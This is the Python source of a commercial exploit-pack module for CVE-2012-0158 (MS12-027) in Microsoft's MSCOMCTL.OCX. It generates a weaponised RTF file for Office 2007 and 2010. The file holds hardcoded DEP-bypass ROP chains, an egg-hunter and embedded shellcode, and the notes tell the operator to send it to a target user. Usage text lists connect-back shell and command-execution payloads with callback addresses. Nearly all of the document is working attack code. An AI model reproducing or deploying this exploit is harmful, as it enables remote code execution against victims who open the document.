
#! /usr/bin/env python
#####################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
#####################################################################################


import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import time
from struct import *

from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
from exploitutils import *
from tcpexploit import *
from httpclientside import httpclientside


NAME = "MS12-027 Microsoft Windows Common Controls MSCOMCTL.OCX Remote Code Execution"
DESCRIPTION = "Exploits a remote code execution vulnerability in MSCOMCTL.OCX"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='Microsoft'
DOCUMENTATION["Date public"] = "2012-04-10"
DOCUMENTATION["Repeatability"] = "One Shot"
DOCUMENTATION['CVE Name']="CVE-2012-0158"
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0158'
DOCUMENTATION['CVSS'] = '0.0'
DOCUMENTATION["References"] = "http://technet.microsoft.com/en-us/security/bulletin/ms12-027"
DOCUMENTATION["Notes"] = """
This is a client-side exploit - run the module and send the created file to the target user.
Module requires MSGR3EN.DLL be loaded by Word before to ensure success. This may require Word is opened before loading the exploit .rtf
Size constraints limit shellcode options.
"""

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2003", "XP", "Vista", "7"]
PROPERTY['MSADV'] = 'MS12-027'

NOTES="""
This is a client-side exploit - run the module and send the created file to the target user.
Module requires MSGR3EN.DLL be loaded by Word before to ensure success. This may require Word is opened before loading the exploit .rtf
Size constraints limit shellcode options.

---------------------------------------------------------------------------------
WP> White Phosphorus Exploit Pack
WP> MS12-027 Microsoft Windows Common Controls MSCOMCTL.OCX Remote Code Execution
---------------------------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions:
0: Windows Universal

Payloads:
0 IE Inject Connect Back
1: HTTPMOSDEF SSL
2: HTTPMOSDEF PLAIN
3: Execute Command

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_ms12_027/wp_ms12_027.py -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
"""

PORT = 0

def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Windows Office 2007 Universal (DEP)", (0x00000000), [WINALL]],
    1 : ["Windows Office 2010 Univeral (DEP)", (0x00000000), [WINALL]]
}

class theexploit(wp_exploit, httpclientside):
    PAYLOADS=["IE Inject Connect Back",
              "Execute Command"]

    DEFAULT_PAYLOAD = 0

    def __init__(self):
        wp_exploit.__init__(self)
        httpclientside.__init__(self)
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.targets = targets
        self.version = 0
        self.isClientD = False
        self.use_universal = True
        self.badstring = "\x00\x0a\x0d\x20"
        self.alignstack = True
        self.encode_printable = True
        self.revertToSelf = True
        self.filename= "".join( [ random.choice(string.uppercase) for x in range(8) ] ) + ".rtf"
        return

    def usage(self):
        self.wp_usage(targets,"-F <filename>")
        return        
        
    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return      
        
    def neededListenerTypes(self):
        self.getArgs()

        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    
    
    def getArgs(self):
        self.wp_getShellcodeType()

        if self.target:
            self.host=self.target.interface
        self.filename=self.argsDict.get('filename',self.filename)
        return
    
    def buildBypass2k7_VP(self, size=2200):
        size += 64
        # MSGR3EN.DLL
        depBypass = pack('<L', 0x3F1D81B3) # popad
        depBypass += pack('<L', 0x3F1D81B4) # esi - ret
        depBypass += pack('<L', 0x3F1D81B4) # esi - ret
        depBypass += pack('<L', 0x3F38E6A9) # ebp - call [eax]; pop edi; pop esi; ret 8
        depBypass += wp_randomstring(4)     # padding
        depBypass += pack('<L', size)       # ebx - dwSize
        depBypass += pack('<L', 0x00000040) # edx - flAllocationType
        depBypass += pack('<L', 0x3F3A3A60) # ecx - flNewProtect
        depBypass += pack('<L', 0x3F101088) # eax - VP
        depBypass += pack('<L', 0x3F2B1C89) # pushad
        depBypass += wp_randomstring(4)     # padding
        depBypass += pack('<L', 0x3F2F92F8) # push esp
        depBypass += wp_randomstring(8)
        return depBypass
    
    def buildBypass2k10_VP(self, size=2200):
        size += 64
        # MSGR3EN.DLL
        depBypass = pack('<L', 0x3F1D822B) # popad
        depBypass += pack('<L', 0x3F102918) # esi - ret
        depBypass += pack('<L', 0x3F102918) # esi - ret
        depBypass += pack('<L', 0x3F394C6E) # ebp - call [eax]; pop edi; pop esi; ret 8
        depBypass += wp_randomstring(4)     # padding
        depBypass += pack('<L', size)       # ebx - dwSize
        depBypass += pack('<L', 0x00000040) # edx - flAllocationType
        depBypass += pack('<L', 0x3F3B2420) # ecx - flNewProtect
        depBypass += pack('<L', 0x3F101108) # eax - VP
        depBypass += pack('<L', 0x3F2B1D09) # pushad
        depBypass += wp_randomstring(4)     # padding
        depBypass += pack('<L', 0x3F337155) # push esp
        depBypass += wp_randomstring(8)
        return depBypass
        
    def makefile(self):
        trigger = open('3rdparty/White_Phosphorus/exploits/wp_ms12_027/wp_ms12_027_trigger.rtf','rb').read()
        
        if self.version == 1:
            searchcode = wp_SearchCode(True, "mov $0x04040404, %edx")
            payload = pack('<L', 0x3F102918) # ret
            payload += wp_randomstring(8)
            payload += self.buildBypass2k10_VP(len(searchcode)+8)
            payload += searchcode
        else:
            searchcode = wp_SearchCode(True, "mov $0x01010101, %edx")
            payload = pack('<L', 0x3F2B1C8A) # ret
            payload += wp_randomstring(8)
            payload += self.buildBypass2k7_VP(len(searchcode)+8)
            payload += searchcode
        
        filedata = trigger[:5126]        
        for i in range(len(payload)):
            filedata += ("%s" % payload[i]).encode("hex")
        
        filedata += trigger[5126:]
        filedata += wp_randomstring(100)
        filedata += 'c00kc00k'
        if self.version == 1:
            filedata += self.buildBypass2k10_VP(len(self.shellcode)+8)
        else:
            filedata += self.buildBypass2k7_VP(len(self.shellcode)+8)
        filedata += self.shellcode
        filedata += wp_randomstring(100)
        return filedata

    def run(self):
        filedata=self.makefile()
    
        outputfile = wp_outputpath(self.filename)
        self.log("WP> Opening %s for output"%outputfile)
        
        fd=file(outputfile,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('WP> Wrote to %s'%(outputfile))
        return 1

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
